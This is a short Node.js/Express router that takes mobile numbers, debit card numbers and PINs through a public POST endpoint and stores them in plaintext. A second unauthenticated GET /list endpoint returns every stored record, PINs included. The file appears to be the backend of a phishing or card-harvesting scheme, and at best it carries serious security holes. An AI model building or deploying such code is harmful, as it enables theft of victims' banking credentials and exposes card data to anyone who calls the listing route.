const express = require("express");
const router = express.Router();
const DebitCardUser = require("../models/DebitCardUser");

// @route   POST /api/debit-cards
// @desc    Save debit card number and PIN
// @access  Public
router.post("/", async (req, res) => {
  const { mobileNumber, cardNumber, pin } = req.body;

  // Validate required fields
  if (!mobileNumber || !cardNumber || !pin) {
    return res.status(400).json({
      error: "Mobile number, Card number, and PIN are required",
    });
  }

  // Validate mobile number
  if (!/^\d{10}$/.test(mobileNumber)) {
    return res.status(400).json({
      error: "Mobile number must be exactly 10 digits",
    });
  }

  try {
    const newDebitCard = new DebitCardUser({
      mobileNumber,
      cardNumber,
      pin,
    });

    await newDebitCard.save();

    res.status(201).json({
      message: "Debit card saved successfully",
      mobileNumber: newDebitCard.mobileNumber,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error, please try again later" });
  }
});


router.get("/list", async (req, res) => {
  try {
    const cards = await DebitCardUser.find().sort({ createdAt: -1 });
    res.status(200).json(cards);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch debit cards" });
  }
});


module.exports = router;
